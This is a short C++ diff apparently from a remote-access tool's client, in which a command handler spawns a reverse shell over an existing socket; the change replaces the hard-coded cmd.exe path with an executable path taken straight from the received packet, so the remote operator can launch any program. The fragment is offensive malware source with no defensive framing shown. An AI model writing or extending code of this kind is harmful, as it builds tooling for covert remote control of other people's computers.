@@ -620,7 +620,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         this->reverseSHELL = new ReverseShell(this);
         this->reverseSHELL->sckSocket = this->sckSocket;
-        this->reverseSHELL->SpawnShell("C:\\Windows\\System32\\cmd.exe");
+        this->reverseSHELL->SpawnShell(paquete.cBuffer.data());
         return;
     }
 
